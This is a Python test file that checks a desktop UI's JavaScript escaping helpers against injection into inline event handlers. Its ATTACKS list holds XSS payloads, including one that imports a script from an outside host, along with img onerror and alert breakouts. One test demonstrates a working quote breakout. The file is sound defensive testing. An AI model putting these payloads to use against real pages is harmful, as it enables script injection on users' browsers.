"""Words from outside never become JavaScript (S-36, S-37, S-58).

A handler is read twice: the browser turns `&#39;` back into a quote BEFORE the JavaScript
parser sees it, so `onclick="f('${esc(x)}')"` was never safe. A Brief option, an SSID or a
guest pass's agent name could end the string and run on the desktop's origin. These run the
real helpers in Node and scan the source for the pattern coming back.
"""
import json
import re
import shutil
import subprocess
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parent.parent
JS = ROOT / "agentos" / "ui" / "src" / "js"
CORE = (JS / "00-core.js").read_text()
node = shutil.which("node")
needs_node = pytest.mark.skipif(not node, reason="needs Node")


def _helpers() -> str:
    """The real esc, jsq and doAttrs lifted out of the file."""
    out = re.search(r"var ESC_MAP=.*?\n", CORE).group(0)
    for fn in ("esc", "jsq", "doAttrs"):
        out += re.search(rf"^function {fn}\(.*$", CORE, re.M).group(0) + "\n"
    return out


def _run(body: str):
    r = subprocess.run([node, "-e", _helpers() + body], capture_output=True, text=True, timeout=30)
    assert r.returncode == 0, r.stderr
    return r.stdout.strip()


ATTACKS = ["');import('//e.vu/a.js')//", "\\');alert(1)//", "&#39;);alert(1)//", '"><img src=x onerror=alert(1)>',
           "back\\slash", "new\nline", "\u2028", "</script>", "${1}", "ಠ_ಠ 日本語 😀"]


@needs_node
def test_esc_covers_the_quote_and_the_backslash():
    got = _run("console.log(esc(`a'b\\\\c<d>e\"f&g`))")
    assert got == "a&#39;b&#92;c&lt;d&gt;e&quot;f&amp;g"


@needs_node
def test_jsq_survives_both_readings_of_an_inline_handler():
    """Decode as the HTML parser does, parse as JavaScript: the string comes back whole, and
    nothing ran."""
    cases = json.dumps(ATTACKS)
    got = _run(f"""
      const html=s=>s.replace(/&#39;/g,"'").replace(/&#92;/g,'\\\\').replace(/&quot;/g,'"').replace(/&lt;/g,'<').replace(/&gt;/g,'>').replace(/&amp;/g,'&');
      const out=[];
      for(const a of {cases}){{
        const attr="f('"+jsq(a)+"')";
        if(/["<>&']/.test(jsq(a)))throw new Error('html-active char in '+jsq(a));
        let seen=null;const f=x=>{{seen=x}};
        new Function('f',html(attr))(f);
        out.push(seen===a);
      }}
      console.log(out.every(Boolean));""")
    assert got == "true"


@needs_node
def test_the_old_way_really_was_broken():
    """Why esc alone is not the fix: the entity is decoded first, so this breaks out."""
    got = _run("""
      const decoded="f('"+esc("');globalThis.ran=1;//")+"')";
      const js=decoded.replace(/&#39;/g,"'");
      globalThis.ran=0;new Function('f',js)(()=>{});
      console.log(globalThis.ran);""")
    assert got == "1"


@needs_node
def test_doattrs_round_trips_outside_text():
    cases = json.dumps(ATTACKS)
    got = _run(f"""
      const html=s=>s.replace(/&#39;/g,"'").replace(/&#92;/g,'\\\\').replace(/&quot;/g,'"').replace(/&lt;/g,'<').replace(/&gt;/g,'>').replace(/&amp;/g,'&');
      const a={cases};
      const m=doAttrs('briefAct',...a).match(/data-do="briefAct" data-do-args="([^"]*)"/);
      console.log(JSON.stringify(JSON.parse(html(m[1])))===JSON.stringify(a));""")
    assert got == "true"


def _handlers(text: str):
    """Every on*="…" attribute in a template, with ${…} nesting respected."""
    for m in re.finditer(r'\bon[a-z]+="', text):
        i, depth, ticks = m.end(), 0, 0
        while i < len(text):
            c = text[i]
            if c == "\n":
                break
            if text.startswith("${", i):
                depth += 1
                i += 2
                continue
            if depth and c == "}":
                depth -= 1
            elif c == '"' and not depth:
                yield text[m.end():i]
                break
            i += 1


def test_no_inline_handler_writes_esc_or_a_bare_string():
    """esc() in a handler, or `'${x}'` with no jsq, is the hole this file exists for."""
    bad = []
    for f in sorted(JS.glob("*.js")):
        if f.name == "00-core.js":
            continue
        for h in _handlers(f.read_text()):
            if re.search(r"\$\{esc\((?!JSON\.stringify)", h) or re.search(r"'\$\{(?!jsq\()", h) \
                    or re.search(r"\$\{JSON\.stringify", h):
                bad.append(f"{f.name}: {h[:120]}")
    assert not bad, "\n".join(bad[:30])


def test_every_data_do_function_is_on_the_list():
    listed = set(re.findall(r"'(\w+)'", re.search(r"DO_FNS=new Set\(\[(.*?)\]\)", CORE, re.S).group(1)))
    used = set()
    for f in JS.glob("*.js"):
        if f.name != "00-core.js":
            used |= set(re.findall(r"doAttrs\('(\w+)'", f.read_text()))
    assert used and used <= listed, used - listed
    bundle = "".join(f.read_text() for f in JS.glob("*.js"))
    for fn in listed:
        assert re.search(rf"function {fn}\(", bundle), f"{fn} is listed and does not exist"


def test_the_named_sites_carry_no_javascript():
    """A Brief option, a guest pass, an SSID, a device and a plugin: outside text, data only."""
    for name, needle in (("24b-brief.js", "doAttrs('briefAct',it.id,'decide',o)"),
                         ("01e-world.js", "doAttrs('tlPassHuddle',g.agent,g.label)"),
                         ("11-settings.js", "doAttrs('tlPassHuddle',p.agent,l.label)"),
                         ("23-syssettings.js", "doAttrs('wifiJoin',n.ssid"),
                         ("23-syssettings.js", "doAttrs('btRemove',dev.path,dev.name)"),
                         ("11b-openclaw.js", "doAttrs('ocpInstall',r.spec)"),
                         ("11b-openclaw.js", "doAttrs('ocpReview',p.id)")):
        assert needle in (JS / name).read_text(), needle


def test_a_menu_label_is_text():
    """An app called <img src=x onerror=…> ran outside its sandbox when a menu opened."""
    body = (JS / "04-motion.js").read_text()
    fn = body[body.index("function showCtxItems"):body.index("/* ---- modal dialogs")]
    assert "${it.label}" not in fn and "b.textContent=it.label" in fn
    assert '<span class="mk">' not in (JS / "04b-appmenu.js").read_text()


def test_an_apps_error_starts_no_build_by_itself():
    """Within 8 s of a build an app's postMessage became the person's own request."""
    body = (JS / "26-studio.js").read_text()
    listener = body[body.index("window.addEventListener('message'"):body.index("function studioAutoFix")]
    assert "studioAutoFix()" not in listener.replace('onclick="studioAutoFix()"', "")
    assert "_autofixed" not in body and "_justBuilt" not in body
    assert "ev.source" in listener, "the message's sender must be the frame showing this app"
    assert "app_error" in body[body.index("function studioBuild"):], "the text travels apart from the request"
